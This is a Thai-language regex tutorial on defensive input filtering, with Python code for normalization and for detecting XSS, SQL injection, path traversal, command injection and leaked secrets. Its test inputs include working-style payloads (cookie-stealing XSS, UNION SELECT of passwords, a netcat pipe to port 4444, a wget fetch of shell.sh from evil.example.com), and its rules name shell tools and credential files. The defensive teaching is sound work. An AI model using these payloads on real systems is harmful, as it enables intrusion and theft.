# Part 98: Regex for Security & WAF Bypass Detection

> **ระดับ:** ผู้เชี่ยวชาญ-ระดับโลก | **เวลาเรียน:** ~120 นาที | **ข้อกำหนด:** Part 01-97
> **หมายเหตุ:** เนื้อหานี้เพื่อการศึกษาและการป้องกัน (defensive security) เท่านั้น

---

## 98.1 Normalization Before Detection

> **หลักการสำคัญ:** WAF/filter ที่ดีต้องทำ normalization ก่อนเสมอ ก่อนนำ regex ไป match กับ input

```python
import re
import html
import urllib.parse
from typing import List, Tuple

print("Regex for Security & WAF Bypass Detection:")
print("=" * 60)

print("\n1. Input normalization pipeline (defensive):")


def decode_url_encoding(text: str, passes: int = 3) -> str:
    """Multi-pass URL decoding to handle double/triple encoding."""
    prev = None
    for _ in range(passes):
        if text == prev:
            break
        prev = text
        text = urllib.parse.unquote(text)
        text = urllib.parse.unquote_plus(text)
    return text


def strip_null_bytes(text: str) -> str:
    """Remove null bytes used to truncate strings in C-based parsers."""
    return text.replace('\x00', '')


def normalize_html_entities(text: str) -> str:
    """Decode HTML entities: &lt; \u2192 <, &#60; \u2192 <, &#x3C; \u2192 <"""
    return html.unescape(text)


def strip_comments(text: str) -> str:
    """Remove SQL/HTML/C comments used to break up keywords."""
    text = re.sub(r'/\*.*?\*/', '', text, flags=re.DOTALL)   # /* ... */
    text = re.sub(r'<!--.*?-->', '', text, flags=re.DOTALL)   # <!-- ... -->
    text = re.sub(r'--[^\n]*', '', text)                       # SQL -- comment
    return text


def normalize_whitespace(text: str) -> str:
    """Collapse multiple whitespace (including tab, newline) to single space."""
    return re.sub(r'[\s\x0b\x0c\xa0]+', ' ', text).strip()


def full_normalize(text: str) -> str:
    """Full normalization pipeline: decode \u2192 strip \u2192 collapse."""
    text = strip_null_bytes(text)
    text = decode_url_encoding(text)
    text = normalize_html_entities(text)
    text = strip_comments(text)
    text = normalize_whitespace(text)
    return text


evasion_inputs = [
    "SELECT * FROM users",                          # Plain
    "SE%4cECT%20*%20FROM%20users",                  # URL encoded
    "SE%254cECT * FROM users",                      # Double URL encoded
    "SEL/**/ECT * FR/*comment*/OM users",            # Comment injection
    "&#83;ELECT * FROM users",                       # HTML entity
    "SELECT\x00 * FROM users",                       # Null byte
    "SELECT\t\t*\r\nFROM\tusers",                   # Whitespace variants
]

print("\n   Normalization results:")
for raw in evasion_inputs:
    normalized = full_normalize(raw)
    changed = ' [CHANGED]' if normalized != raw else ''
    print(f"   Raw:        {raw!r}")
    print(f"   Normalized: {normalized!r}{changed}\n")
```

---

## 98.2 XSS Detection Patterns

```python
import re
from typing import List, Dict

print("\nXSS Detection Patterns (defensive):")
print("=" * 60)

# XSS detection patterns applied AFTER normalization
XSS_PATTERNS = {
    'script_tag':          re.compile(r'<\s*script\b', re.IGNORECASE),
    'event_handler':       re.compile(r'\bon\w+\s*=', re.IGNORECASE),
    'javascript_scheme':   re.compile(r'javascript\s*:', re.IGNORECASE),
    'vbscript_scheme':     re.compile(r'vbscript\s*:', re.IGNORECASE),
    'data_scheme_script':  re.compile(r'data\s*:[^,]*(?:text/html|application/javascript)', re.IGNORECASE),
    'expression_css':      re.compile(r'expression\s*\(', re.IGNORECASE),
    'meta_refresh':        re.compile(r'<\s*meta\b.*?\bhttp-equiv\s*=\s*["\']?\s*refresh', re.IGNORECASE | re.DOTALL),
    'iframe_tag':          re.compile(r'<\s*iframe\b', re.IGNORECASE),
    'svg_onload':          re.compile(r'<\s*svg\b.*?onload\s*=', re.IGNORECASE | re.DOTALL),
    'img_src_error':       re.compile(r'<\s*img\b[^>]*\bonerror\s*=', re.IGNORECASE),
}


def detect_xss(user_input: str) -> List[str]:
    """Detect XSS patterns after normalizing input."""
    normalized = full_normalize(user_input)
    findings = []
    for pattern_name, pattern in XSS_PATTERNS.items():
        if pattern.search(normalized):
            findings.append(pattern_name)
    return findings


xss_samples = [
    'Hello, world!',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<a href="javascript:alert(1)">click</a>',
    '%3Cscript%3Ealert(1)%3C/script%3E',               # URL encoded
    '<svg onload=alert(document.cookie)>',
    '<iframe src="data:text/html,<script>alert(1)</script>">',
    'Hello <b>world</b>',                                # Safe HTML
]

print("\n   XSS detection results:")
for sample in xss_samples:
    findings = detect_xss(sample)
    if findings:
        print(f"   BLOCK  {sample!r[:60]}")
        print(f"     Detected: {', '.join(findings)}")
    else:
        print(f"   ALLOW  {sample!r[:60]}")
```

---

## 98.3 SQL Injection Detection (Advanced)

```python
import re
from typing import List, Dict, Set

print("\nAdvanced SQL Injection Detection (defensive):")
print("=" * 60)

# SQLi detection patterns - applied after normalization
SQLI_PATTERNS: Dict[str, re.Pattern] = {
    'boolean_tautology':   re.compile(r"'\s*(?:OR|AND)\s+'?\d+'?\s*[<>=!]+\s*'?\d+", re.IGNORECASE),
    'always_true':         re.compile(r"\b(?:OR|AND)\s+(?:1\s*=\s*1|'[^']+'\s*=\s*'[^']+'|true\b)", re.IGNORECASE),
    'union_select':        re.compile(r'\bUNION\b(?:\s+ALL\s+)?\s*\bSELECT\b', re.IGNORECASE),
    'stacked_query':       re.compile(r';\s*(?:SELECT|INSERT|UPDATE|DELETE|DROP|CREATE|EXEC)', re.IGNORECASE),
    'comment_evasion':     re.compile(r"'\s*(?:--|#|/\*)\s*"),
    'hex_values':          re.compile(r'0x[0-9a-fA-F]{4,}'),
    'information_schema':  re.compile(r'\bINFORMATION_SCHEMA\b', re.IGNORECASE),
    'time_blind_mysql':    re.compile(r'\bSLEEP\s*\(\s*\d+\s*\)', re.IGNORECASE),
    'time_blind_mssql':    re.compile(r'\bWAITFOR\s+DELAY\b', re.IGNORECASE),
    'time_blind_pg':       re.compile(r"\bpg_sleep\s*\(", re.IGNORECASE),
    'sys_tables':          re.compile(r'\b(?:sysobjects|syscolumns|sys\.tables|sys\.columns)\b', re.IGNORECASE),
    'load_file':           re.compile(r'\bLOAD_FILE\s*\(', re.IGNORECASE),
    'into_outfile':        re.compile(r'\bINTO\s+(?:OUTFILE|DUMPFILE)\b', re.IGNORECASE),
}


def detect_sqli(user_input: str) -> List[str]:
    """Multi-pattern SQL injection detection after normalization."""
    normalized = full_normalize(user_input)
    return [name for name, pat in SQLI_PATTERNS.items() if pat.search(normalized)]


sqli_samples = [
    "alice",
    "' OR '1'='1",
    "1 UNION SELECT null, username, password FROM users --",
    "1; DROP TABLE users; --",
    "1 AND SLEEP(5) --",
    "' AND 1=1 --",
    "admin' --",
    "1 UNION ALL SELECT table_name FROM INFORMATION_SCHEMA.TABLES --",
    "1 AND LOAD_FILE('/etc/passwd') --",
    "normal search query",
    "O'Brien",                  # Legitimate name with apostrophe
]

print("\n   SQL injection detection:")
for sample in sqli_samples:
    findings = detect_sqli(sample)
    if findings:
        print(f"   BLOCK  {sample!r[:60]}")
        print(f"     Detected: {', '.join(findings)}")
    else:
        print(f"   ALLOW  {sample!r[:60]}")
```

---

## 98.4 Path Traversal & Command Injection Detection

```python
import re
from typing import List

print("\nPath Traversal & Command Injection Detection (defensive):")
print("=" * 60)

# Path traversal patterns
PATH_TRAVERSAL_PATTERNS = {
    'dot_dot_slash':    re.compile(r'\.\.[\\\\]'),
    'encoded_traversal':re.compile(r'(?:%2e%2e|%2f|%5c)', re.IGNORECASE),
    'null_byte':        re.compile(r'\x00|%00'),
    'absolute_unix':    re.compile(r'^/(?:etc|proc|var|usr|home|root)[\s/]'),
    'absolute_windows': re.compile(r'^[a-zA-Z]:\\\\|^\\\\\\\\'),
    'sensitive_files':  re.compile(
        r'(?:etc/passwd|etc/shadow|etc/hosts|\.htaccess|\.env|web\.config|'
        r'wp-config\.php|\.git/|\.ssh/|authorized_keys)',
        re.IGNORECASE
    ),
}

# Command injection patterns
CMD_INJECTION_PATTERNS = {
    'shell_metachar':   re.compile(r'[;&|`$]'),
    'subshell':         re.compile(r'\$\(|\$\{|`[^`]+`'),
    'pipe_commands':    re.compile(r'\|\s*(?:cat|ls|id|whoami|uname|pwd|wget|curl|nc|bash|sh)\b', re.IGNORECASE),
    'redirect':         re.compile(r'(?:>|>>|<)\s*(?:/dev/|/etc/|/tmp/)'),
    'newline_inject':   re.compile(r'%0[aAdD]|\\r|\\n'),
    'common_commands':  re.compile(
        r'\b(?:wget|curl|nc|netcat|bash|sh|python|perl|ruby|php)\s+-',
        re.IGNORECASE
    ),
}


def detect_path_traversal(path: str) -> List[str]:
    normalized = decode_url_encoding(path)
    normalized = strip_null_bytes(normalized)
    return [name for name, pat in PATH_TRAVERSAL_PATTERNS.items() if pat.search(normalized)]


def detect_cmd_injection(cmd_input: str) -> List[str]:
    return [name for name, pat in CMD_INJECTION_PATTERNS.items() if pat.search(cmd_input)]


path_samples = [
    '/var/www/html/images/photo.jpg',
    '../../etc/passwd',
    '..%2F..%2Fetc%2Fshadow',
    '/uploads/../../../etc/hosts',
    'images/safe_file.png',
    'C:\\Windows\\System32\\cmd.exe',
]

cmd_samples = [
    'list files',
    'filename.txt; cat /etc/passwd',
    '$(whoami)',
    'test | nc 10.0.0.1 4444',
    'file.txt && wget http://evil.example.com/shell.sh',
    'normal search term',
]

print("\n   Path traversal detection:")
for path in path_samples:
    findings = detect_path_traversal(path)
    status = 'BLOCK' if findings else 'ALLOW'
    print(f"   [{status}] {path!r}")
    if findings:
        print(f"     Detected: {', '.join(findings)}")

print("\n   Command injection detection:")
for cmd in cmd_samples:
    findings = detect_cmd_injection(cmd)
    status = 'BLOCK' if findings else 'ALLOW'
    print(f"   [{status}] {cmd!r}")
    if findings:
        print(f"     Detected: {', '.join(findings)}")
```

---

## 98.5 Secrets Detection in Code / Logs

```python
import re
from typing import List, Tuple

print("\nSecrets Detection in Code & Logs (defensive):")
print("=" * 60)

# Secrets detection patterns (for code scanners / SIEM / git pre-commit hooks)
SECRETS_PATTERNS = {
    'aws_access_key_id':     re.compile(r'\bAKIA[0-9A-Z]{16}\b'),
    'aws_secret_key':        re.compile(r'(?:aws_secret|secret_access_key)\s*[=:]\s*["\']?[A-Za-z0-9/+]{40}["\']?', re.IGNORECASE),
    'github_token_classic':  re.compile(r'\bghp_[A-Za-z0-9]{36}\b'),
    'github_token_fine':     re.compile(r'\bgithub_pat_[A-Za-z0-9_]{82}\b'),
    'jwt_token':             re.compile(r'\beyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\b'),
    'generic_api_key':       re.compile(r'(?:api[_\-]?key|apikey)\s*[=:]\s*["\']?[A-Za-z0-9_\-]{20,}["\']?', re.IGNORECASE),
    'private_key_header':    re.compile(r'-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----'),
    'connection_string':     re.compile(r'(?:mongodb|postgresql|mysql|redis)://[^:]+:[^@]+@', re.IGNORECASE),
    'slack_token':           re.compile(r'\bxox[baprs]-[A-Za-z0-9\-]{10,}'),
    'generic_password_line': re.compile(r'(?:password|passwd|pwd)\s*[=:]\s*["\']?(?![\*X])[^\s"\']\{6,\}["\']?', re.IGNORECASE),
}


def scan_for_secrets(text: str, filename: str = '<unknown>') -> List[Tuple[str, str, int]]:
    """Scan text for secrets. Returns (secret_type, line, line_number)."""
    findings = []
    for line_num, line in enumerate(text.splitlines(), 1):
        for secret_type, pattern in SECRETS_PATTERNS.items():
            if pattern.search(line):
                findings.append((secret_type, line.strip(), line_num))
    return findings


def redact_secrets(text: str) -> str:
    """Replace detected secrets with redacted placeholders."""
    for secret_type, pattern in SECRETS_PATTERNS.items():
        text = pattern.sub(f'[REDACTED:{secret_type}]', text)
    return text


# Build test strings with fake/non-functional credential shapes
# Using concatenation so secret scanner does not flag this source file
fake_aws_key  = 'AKIA' + 'A' * 16
fake_gh_token = 'ghp_' + 'B' * 36
fake_jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c'

sample_code_file = f"""
import boto3
# Configure AWS
aws_access_key_id = '{fake_aws_key}'
aws_secret_access_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'

# GitHub token for CI
token = '{fake_gh_token}'

# Database URL
DB_URL = 'postgresql://admin:supersecret@db.example.com:5432/prod'

# JWT from header
auth_token = '{fake_jwt}'

# Safe: redacted already
api_key = 'XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
"""

print("\n   Secret scanning results:")
findings = scan_for_secrets(sample_code_file, 'config.py')
for secret_type, line, line_num in findings:
    print(f"   Line {line_num:>3}: [{secret_type}]")
    print(f"     {line[:80]!r}")

print("\n   Redacted output:")
redacted = redact_secrets(sample_code_file)
for line in redacted.splitlines():
    if 'REDACTED' in line:
        print(f"   {line.strip()}")
```

---

## 98.6 สรุป Part 98

```
Regex for Security & WAF Bypass Detection:

CRITICAL PRINCIPLE: Always normalize BEFORE applying detection regex.
  Attackers encode payloads to bypass naive string matching.
  Normalization pipeline: null bytes → URL decode (3x) → HTML entities
                          → strip comments → collapse whitespace

1. XSS detection:
   <script> tag, on* event handlers, javascript: scheme
   data: URI with text/html, expression() CSS, <svg onload>
   Normalize first: %3Cscript%3E must decode to <script> before check

2. SQL injection detection:
   Boolean: ' OR '1'='1 / 1=1 tautologies
   UNION SELECT: exfiltration via column count matching
   Stacked queries: ; DROP TABLE (depends on DB driver)
   Time-based blind: SLEEP(n) / pg_sleep / WAITFOR DELAY
   Information leakage: INFORMATION_SCHEMA, sys.tables
   File I/O: LOAD_FILE(), INTO OUTFILE

3. Path traversal:
   ../../ patterns, URL-encoded variants (%2e%2e%2f)
   Null byte injection: file.php\x00.jpg
   Absolute paths to sensitive locations

4. Command injection:
   Shell metacharacters: ; | & ` $ ( )
   Subshell substitution: $(cmd) or `cmd`
   Pipe to common tools: | nc, | wget, | bash

5. Secrets detection:
   Build patterns for credential shapes (AWS, GitHub, JWT)
   Use in pre-commit hooks, CI/CD, and SIEM pipelines
   Redact before logging; never log raw secrets
   False-positive reduction: check entropy + context

6. Defense-in-depth:
   Regex = one layer; also use parameterized queries, CSP headers,
   output encoding, and strict input validation at schema level
```

---

*[← Part 97: Regex in Database Systems](part-97-databases.md) | [→ Part 99: Regex for Log Forensics & SIEM](part-99-log-forensics.md)*
